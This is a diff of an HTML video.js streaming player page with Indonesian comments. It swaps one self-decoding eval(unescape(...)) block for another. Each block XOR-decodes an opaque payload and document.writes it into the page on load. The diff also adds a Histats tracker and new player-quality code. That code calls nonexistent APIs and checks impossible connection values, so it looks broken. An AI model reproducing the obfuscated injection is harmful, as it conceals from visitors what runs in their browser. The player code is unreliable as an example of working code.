@@ -4,7 +4,8 @@
 <meta name="generator" content="JDiff v1.1.0">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE-edge">
-  <meta name="dns-prefetch" content="https://opentv.pages.dev/">
+<meta name="dns-prefetch" content="https://opentv.pages.dev/">
+<meta name="dns-prefetch" content="https://vod.linknetott.swiftcontent.com">
 <meta name="dns-prefetch" content="https://rawgit.com">
 <meta name="dns-prefetch" content="https://vjs.zencdn.net">
 <meta name="dns-prefetch" content="https://cdn.jsdelivr.net">
@@ -17,11 +18,12 @@
 <meta name="dns-prefetch" content="https://ctrl.laotv.la">
 <meta name="dns-prefetch" content="https://rbmn-live.akamaized.net">
 <meta name="dns-prefetch" content="https://image.discovery.indazn.com">
+<meta name="dns-prefetch" content="https://sstatic1.histats.com">
+<meta name="dns-prefetch" content="https://s10.histats.co">
+<meta name="dns-prefetch" content="https://arc.io">
   <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
 <meta name="mobile-web-app-capable" content="yes" />
-<link href="https://rawgit.com/mkhazov/videojs-resolution-switcher/master/lib/videojs-resolution-switcher.css" rel="stylesheet">
 <link href="https://vjs.zencdn.net/5-unsafe/video-js.css" rel="stylesheet">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/videojs-logo@latest/dist/videojs-logo.css">
  <style>
 body, html {
     background-color: #000;
@@ -60,15 +62,11 @@ canvas {
 .vjs-default-skin .vjs-big-play-button {
   font-size: 3em;
   line-height: 1.5em;
-  color: #1DA1F2;
-  border-radius: 50%;
   height: 1.5em;
   width: 3em;
   /* 0.06666em = 2px default */
   border: 0.06666em solid #fff;
   /* 0.3em = 9px default */
-  border: 2px solid #1DA1F2; /* Ganti warna border menjadi warna biru Twitter (#1DA1F2) */
-  border-radius: 50%; /* Set border-radius menjadi setengah dari tinggi */
   border-radius: 0.3em;
   /* Align center */
   left: 50%;
@@ -341,7 +339,21 @@ img#vjs-logobrand-image {
 .vjs-user-inactive.vjs-paused img#vjs-logobrand-image {
 	visibility: visible;
 }
-
+.vjs-ad-playing a#vjs-logobrand-image-destination {
+	display: none;
+}
+.video-container {
+      position: relative;
+    }
+    .quality-label {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 24px;
+      color: white;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+    }
 </style>
 <script src="https://vjs.zencdn.net/ie8/1.1.2/videojs-ie8.min.js"></script>
 <script src="https://raw.githubusercontent.com/titpetric/PeerLive/master/clientVOD/js/videojs.hls.orig.js"></script>
@@ -618,43 +630,104 @@ gtag("event", "page_view", {
 </HEAD>
 <BODY topmargin=0 leftmargin=0 style="background:transparent;background-color:#000000">
 <script src="https://raw.githubusercontent.com/Mewte/videojs-logobrand/master/src/videojs.logobrand.js"></script>
-<div id='vplayer'>
-<script type="text/javascript">
-<!-- 
-eval(unescape('%66%75%6e%63%74%69%6f%6e%20%6d%38%37%34%66%36%34%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%35%31%34%32%31%32%30%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%30%36%37%33%33%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%31%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
-eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%6d%38%37%34%66%36%34%28%27') + '%38%74%67%73%62%71%71%39%0e%0d%63%73%6c%71%75%22%71%65%62%7e%60%73%27%39%22%74%6f%65%65%70%63%74%2d%2e%77%6d%73%72%6e%67%7a%65%73%20%2a%38%08%0b%6b%61%76%22%68%70%61%65%58%73%6e%6e%6a%69%65%6e%22%3b%21%72%6d%6a%7a%62%75%2f%73%61%67%6a%65%2f%7a%69%7b%2f%69%76%62%63%3b%0d%08%74%6d%61%7a%6e%73%2b%73%66%62%6e%63%2c%7c%69%70%2f%65%70%66%63%21%38%26%64%75%6a%64%76%6a%78%6f%2d%2c%21%7a%09%08%22%24%75%6a%6a%7c%2f%70%60%75%55%61%71%75%63%74%76%49%6e%62%61%60%73%2f%2f%50%65%62%66%70%66%7b%28%29%27%28%6f%72%76%72%71%3b%33%30%70%78%7c%29%67%6c%74%77%76%6b%66%66%6a%6a%2f%60%76%6e%36%2f%29%3f%24%0e%08%21%29%75%6d%6c%74%29%73%65%76%56%66%71%76%6e%74%71%4f%66%64%62%65%70%2c%28%55%74%6e%73%2a%44%68%60%68%76%2b%28%21%2b%4e%78%7b%6e%6b%6d%64%37%35%2c%34%21%2a%4d%62%6f%72%7f%3c%27%45%6c%66%76%70%69%65%29%32%37%3a%21%52%49%2d%4b%3f%3a%3a%43%29%43%72%6c%6d%63%37%57%4f%57%32%41%2f%3b%33%35%3e%33%37%28%32%32%37%2a%22%42%79%71%69%60%58%60%64%4f%69%70%30%35%34%30%2f%30%31%21%2f%4b%4a%56%4b%4d%2e%21%65%6a%68%60%21%4e%61%67%6f%75%2a%22%44%61%73%74%68%66%36%35%32%37%2a%31%2c%36%39%37%35%29%32%34%32%22%4d%75%63%69%6d%6e%21%50%64%67%64%74%69%33%33%34%3b%2f%3c%37%2c%2c%3c%08%0c%22%22%70%69%69%74%27%74%62%73%53%60%75%75%65%71%75%4a%66%6a%65%62%75%29%2e%43%73%73%69%6a%65%28%25%21%2c%61%6a%75%73%76%6d%63%65%69%62%71%60%71%76%6c%60%68%3d%65%7f%4b%6a%63%40%64%6e%56%6a%4d%4d%55%78%4f%32%4c%6a%42%74%4e%69%53%30%63%47%49%32%4a%6f%71%51%57%40%4d%3a%29%61%79%48%7e%65%5b%4a%62%50%6e%4c%79%48%6c%4d%32%4a%55%59%34%58%45%68%7e%4a%6c%7f%69%60%6b%47%76%5b%5c%4a%33%4c%6c%77%70%61%4b%30%68%50%48%32%6d%4e%6c%78%6c%65%5b%44%34%4a%68%70%71%4f%51%40%33%48%6c%4d%35%4b%45%49%7a%6f%52%2b%52%67%6b%4b%7a%7b%56%4b%57%4e%6e%4c%48%41%33%54%52%36%64%7d%71%4d%66%43%67%30%31%51%56%6b%34%79%4e%57%63%62%6d%52%70%72%78%30%63%3f%22%63%79%72%6a%7b%66%70%38%58%60%62%2e%22%34%38%2d%4b%6a%6f%2a%35%31%35%31%22%32%33%3b%37%31%33%31%35%27%48%48%52%3f%22%4b%62%7a%2e%4a%68%62%38%34%34%31%37%34%34%31%32%3c%29%51%66%73%69%38%37%3f%22%51%62%6d%66%5c%6a%71%60%3e%4b%65%7a%2b%2f%3c%22%0e%03%21%25%75%66%73%71%70%6c%24%6d%73%62%6d%50%77%6c%68%6c%68%61%6e%2a%62%72%71%65%7a%2d%73%69%6c%73%2e%22%67%73%6b%76%66%66%6b%73%74%2c%3b%0d%08%7b%0e%08%71%65%62%7e%60%73%29%74%65%61%60%7a%2a%29%22%21%3a%39%21%7a%09%08%22%24%71%6e%62%72%66%77%29%71%6b%65%79%2a%2f%3c%0d%0b%76%2a%38%08%0b%27%26%3e%33%71%64%70%6a%79%75%3b%08%0b%3b%70%69%66%63%70%22%6a%6d%3e%27%71%6b%72%76%6e%61%7f%66%70%23%29%64%69%64%74%72%39%20%74%6f%65%65%70%26%6b%70%27%77%6d%73%2d%66%63%67%61%76%65%75%2a%72%6c%6c%68%20%22%71%75%79%6d%6e%3e%27%7e%6a%63%72%6a%38%37%31%32%26%34%69%62%6c%68%6f%72%38%31%34%31%25%3c%7d%66%7d%73%2e%64%6a%69%6b%6a%3b%67%66%67%75%62%75%3c%25%26%7b%69%60%75%6a%3e%2b%32%35%37%26%25%26%6a%65%6f%68%6a%75%36%23%36%37%31%20%24%22%67%75%6f%76%73%78%6d%70%38%23%73%74%75%65%26%21%72%70%7c%75%62%75%3e%25%6e%76%76%74%74%38%30%38%70%75%60%6f%73%70%2c%72%67%68%65%74%27%65%62%71%30%65%65%6c%6c%63%73%2c%78%6e%63%75%25%21%64%71%76%73%74%6d%61%7a%29%64%74%69%75%75%77%6e%77%24%71%70%66%65%70%66%63%3e%25%65%75%76%75%23%22%71%65%62%7e%72%6a%69%6a%69%6c%63%3f%0d%0b%02%0a%39%72%70%70%74%67%65%24%74%70%64%36%23%6d%73%75%77%73%38%33%35%77%73%65%27%6d%6e%69%6c%69%61%76%73%70%75%2c%74%70%6a%63%73%64%76%68%76%65%6a%75%2c%64%78%6e%34%42%70%69%72%65%6c%70%30%4a%4d%5c%30%49%6c%77%60%37%47%6a%67%6f%6c%66%65%26%37%3f%64%6f%32%31%32%23%33%39%30%62%6f%61%60%79%29%69%37%75%3c%23%22%75%72%71%62%38%28%64%76%72%6e%6f%64%61%75%62%70%6b%36%77%69%62%2c%61%74%71%6e%66%27%6e%75%60%68%70%74%6e%2b%3a%0e%08%21%29%21%39%36%77%6c%62%65%73%3a%3d%33%65%62%77%3b%3b%30%63%6d%74%3c15142120%35%30%33%30%38%30%34' + unescape('%27%29%29%3b'));
-// -->
-</script>
-   
 <script src='https://vjs.zencdn.net/5-unsafe/video.js'></script>
-<script src='https://raw.githubusercontent.com/Playtekno/opentv/main/js/smooth_tech.js'></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script src="https://unpkg.com/videojs-flash/dist/videojs-flash.js"></script>
 <script src="https://unpkg.com/videojs-contrib-hls/dist/videojs-contrib-hls.js"></script>
 <script src="https://use.fontawesome.com/f4da8251b8.js"></script>
-<script src="https://rawgit.com/mkhazov/videojs-resolution-switcher/master/lib/videojs-resolution-switcher.js"></script>  
-
-<script>
-    (function(window, videojs) {
-      var examplePlayer = window.examplePlayer = videojs('vjsplayer');
-player.smoothTech();
-    }(window, window.videojs));
-	plugins: {
-			videoJsResolutionSwitcher: {
-			    ui: true,
-				default: 'mid',
-				dynamicLabel: false
-			}
-		}
-	}, function(){
-		var player = this;
-		player.on('resolutionchange', function(){
-			console.info('Source changed')
-});
-  </script>
-<script>
-videojs('vjsplayer').videoJsResolutionSwitcher()
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%67%66%64%37%31%66%31%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%32%37%30%32%33%37%30%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%31%31%30%36%30%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%30%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%67%66%64%37%31%66%31%28%27') + '%39%76%63%72%6f%70%76%38%0c%0b%63%69%6e%76%71%20%70%6a%61%7b%63%73%21%3d%26%76%6c%61%65%6f%6c%73%2a%21%77%6b%73%76%6c%64%7c%65%72%21%29%39%0b%0b%71%6c%67%79%60%77%2e%74%63%63%6a%59%2f%79%68%74%2e%69%6a%61%64%26%3d%22%60%74%6f%63%72%69%6a%6b%28%29%26%7b%0f%0c%21%21%2f%29%20%41%64%70%61%72%6b%63%68%21%48%50%26%61%61%61%72%65%75%73%22%6d%6d%68%65%68%0d%0f%25%20%76%67%72%22%65%6d%68%65%68%74%4c%55%20%3d%26%77%6b%68%65%6e%77%28%6e%64%73%69%67%67%74%6d%74%2f%68%70%67%64%61%77%65%73%75%2e%63%62%65%73%65%75%73%3e%08%0a%20%26%2f%2d%26%52%64%74%26%6e%6c%69%61%69%26%68%67%67%65%64%72%0b%0a%25%25%74%68%6f%73%2c%75%64%75%52%63%71%70%60%73%74%4e%65%63%62%64%73%28%21%52%60%63%65%72%63%72%25%2a%21%26%68%72%74%75%76%3a%2f%29%77%75%71%2f%67%69%74%73%71%68%65%64%6f%61%2c%65%6e%6c%2f%21%29%3e%08%0a%20%26%74%6a%6f%72%2f%73%63%74%57%60%71%75%63%73%76%4e%64%60%64%63%72%2d%22%41%63%65%65%71%75%2c%42%6f%68%74%77%6a%6c%2d%47%6c%6e%69%76%2c%4f%74%69%62%6c%6e%27%2a%20%25%2c%26%28%3b%0b%0a%25%25%74%68%6f%73%2c%75%64%75%52%63%71%70%60%73%74%4e%65%63%62%64%73%28%21%41%66%66%65%73%75%2d%41%69%6f%75%72%69%6c%28%44%6c%6c%69%77%2f%4b%64%75%68%69%64%76%22%2c%20%21%47%47%52%2d%21%50%49%53%51%29%20%50%53%54%25%2f%3a%0c%0a%26%20%71%6d%69%73%28%73%67%72%53%64%71%73%65%76%71%48%65%67%64%67%74%29%26%41%65%63%60%76%73%2d%45%6f%6c%72%73%6e%6c%2b%41%69%69%6f%77%2b%48%67%67%65%64%72%75%27%29%25%27%43%69%6e%76%63%6f%75%2d%52%79%75%60%27%29%3d%0d%08%26%21%75%68%6f%73%2b%76%65%74%54%65%73%73%64%72%74%4e%65%64%61%65%72%2e%27%5a%2b%47%6e%72%71%61%77%61%65%64%2b%46%6d%74%26%2d%20%65%6c%6c%60%6e%74%4f%50%2b%3d%0c%0b%7d%3d%0d%0f%08%0a%20%26%74%6a%6f%72%2f%73%63%74%57%60%71%75%63%73%76%4e%64%60%64%63%72%2d%22%55%73%63%72%2f%47%66%64%6e%72%27%29%25%27%4d%69%7a%6b%6a%6d%60%2f%33%2e%35%25%28%4c%6f%6e%77%7e%3a%21%41%68%64%77%6a%69%64%26%31%30%3d%21%52%4d%2b%47%3c%3c%38%42%26%42%77%6f%6d%65%2f%55%4b%54%34%41%2e%34%32%32%31%33%31%2e%36%30%34%2c%20%41%76%70%6e%63%56%64%62%4d%69%71%2a%35%33%31%2e%31%30%21%29%4b%4e%54%48%49%2c%20%6a%69%69%63%21%46%65%65%6b%6a%2c%20%43%6e%72%6d%6b%64%2e%31%36%33%2b%35%2e%35%36%36%32%28%30%30%34%26%4d%6a%67%69%6c%63%20%51%67%67%60%72%6f%2f%30%36%37%2e%35%36%25%2f%3a%0c%0a%26%20%77%60%74%75%74%6e%22%6a%6e%60%64%49%72%6c%62%69%6e%67%6c%2c%67%71%71%6c%7f%28%71%6d%69%73%2a%20%63%74%66%74%6d%63%6e%71%76%29%3b%0b%0a%7f%0b%0b%71%6c%67%79%60%77%2e%72%63%61%66%7f%29%29%29%26%3d%3b%25%7b%0d%0c%20%22%76%6d%60%79%63%72%2b%75%6c%61%7f%28%2b%3d%0c%0b%7d%2f%3b%08%0f%20%20%3a%2f%71%65%73%68%70%72%3e%25%25%20%20%0b%0a%22%26%3d%65%69%70%20%66%69%61%73%75%3d%20%70%68%65%65%69%2d%66%6a%6e%74%67%69%6c%63%73%23%3e%0b%0a%39%73%69%64%63%6f%22%6f%65%3c%22%70%6a%76%75%6c%61%7f%65%70%24%21%62%6c%67%73%76%38%22%76%6f%64%67%69%2c%6b%73%26%76%6f%76%2d%64%63%66%63%73%6d%75%2d%75%6b%6c%6b%22%20%75%74%7b%6a%64%3c%22%71%69%61%71%68%3a%37%30%32%23%3a%69%65%6f%67%6d%71%3a%31%36%30%27%3d%75%64%78%72%2d%64%69%69%67%68%3a%61%63%6f%75%65%74%3b%27%25%77%69%62%74%6a%3b%23%30%30%36%25%27%25%68%65%6f%67%6a%72%3c%23%31%36%30%20%27%20%63%69%6e%76%74%6e%6d%73%3b%22%71%77%75%65%24%20%72%69%72%75%65%74%3d%27%6d%74%74%76%73%38%29%2e%6e%70%63%6e%71%73%2e%70%67%67%67%75%2f%65%65%70%2f%67%64%6e%6e%63%72%2c%71%64%63%70%24%20%64%70%74%6f%76%6c%63%7f%21%62%6f%68%74%77%6a%6c%73%26%70%70%63%6d%6e%61%62%3d%27%64%75%74%69%22%22%76%6d%60%79%75%69%6b%69%69%6e%63%3e%0f%0c%08%08%3c%75%6f%70%77%63%65%26%73%70%65%3c%23%68%72%74%75%76%3a%2f%29%76%6d%62%2f%6d%69%68%6b%6b%60%74%6f%72%74%2c%75%76%68%66%72%63%6a%6b%74%65%68%74%2c%65%6e%6c%2f%45%6f%6b%71%65%6e%72%2f%4a%4a%52%2e%4c%6f%76%60%2a%43%68%67%6e%6c%63%6d%24%32%3e%63%6d%31%31%30%23%32%3b%29%68%6f%64%63%78%2b%68%33%75%3e%22%22%72%78%71%65%3b%22%64%75%70%6c%6f%63%63%72%68%6e%6e%29%76%6b%61%2e%61%76%70%6e%63%2f%6c%70%63%67%70%77%6c%22%38%3c%2d%70%68%65%65%69%3e12702370%35%35%30%30%36%30%32' + unescape('%27%29%29%3b'));
+// -->
 </script>
+   <script>
+    (function (window, videojs) {
+  var examplePlayer = (window.examplePlayer = videojs("vjsplayer", {
+    html5: {
+      hls: {
+        overrideNative: true,
+        smoothQualityChange: true,
+        maxBufferLength: 30,
+        maxMaxBufferLength: 60,
+        enableLowInitialPlaylist: true,
+        overrideNativeAudioTracks: true,
+        overrideNativeVideoTracks: true,
+      },
+    },
+  }));
+
+  // Tetapkan bitrate awal yang lebih rendah untuk memulai pemutaran lebih cepat
+  examplePlayer.tech_.hls.options.startLevel = 1;
+
+  // Pilih resolusi terendah saat pertama load
+  examplePlayer.on("loadedmetadata", function () {
+    examplePlayer.quality("low");
+  });
+
+  // Sesuaikan resolusi dengan koneksi internet
+  function updateQuality() {
+  // Dapatkan tipe koneksi saat ini
+  var connectionType = window.navigator.connection.effectiveType;
+
+  // Pilih resolusi berdasarkan tipe koneksi
+  switch (connectionType) {
+    case "cellular":
+      examplePlayer.quality("low");
+      break;
+    case "wifi":
+      examplePlayer.quality("medium");
+      break;
+    case "wired":
+      examplePlayer.quality("high");
+      break;
+    default:
+      examplePlayer.quality("low");
+      break;
+  }
+}
+
+  // Jalankan updateQuality() setiap 5 detik
+  setInterval(updateQuality, 5000);
+
+  // Perbarui resolusi saat level berubah
+  examplePlayer.on("levelchange", function () {
+    updateQuality();
+  });
+
+  // Tampilkan teks keterangan kualitas di tengah atas video
+  function showQualityLabel(quality) {
+    var qualityLabel = document.getElementById("qualityLabel");
+    qualityLabel.textContent = "Playback in " + quality + " Quality";
+  }
+
+  // Perbarui teks keterangan saat kualitas berubah
+  examplePlayer.on("qualitychange", function () {
+    var currentQuality = examplePlayer.qualityLevels().find(".vjs-selected").label();
+    showQualityLabel(currentQuality);
+  });
+
+  // Tampilkan teks keterangan saat video dimulai
+  examplePlayer.on("play", function () {
+    var currentQuality = examplePlayer.qualityLevels().find(".vjs-selected").label();
+    showQualityLabel(currentQuality);
+  });
+
+  // Set frame rate menjadi 24fps (23.976)
+  examplePlayer.tech_.hls.on("manifestParsed", function () {
+    examplePlayer.tech_.hls.masterPlaylistController_.mainSegmentLoader_.mediaSource_.videoBuffer_.appendMode_ = "segments";
+    examplePlayer.tech_.hls.masterPlaylistController_.mainSegmentLoader_.mediaSource_.videoBuffer_.segmentParser_.parseSegmentBinaryData = function (
+      data,
+      byteOffset,
+      segmentInfo
+    ) {
+      var segment = this.parseSegmentBinaryData.originalMethod.call(this, data, byteOffset, segmentInfo);
+      segment.videoFrameRate = 23.976; // Mengubah frame rate menjadi 24fps (23.976)
+      return segment;
+    };
+  });
+})(window, videojs);
+  </script>
 <script>
 var player = videojs('vjsplayer');
 
@@ -691,4 +764,15 @@ function skipS3MV(skipBy) {
     })
 </script>
 </div>
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4834164,4,605,110,55,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4834164&101" alt="counters" border="0"></a></noscript>
+<!-- Histats.com  END  -->
 </BODY></HTML>
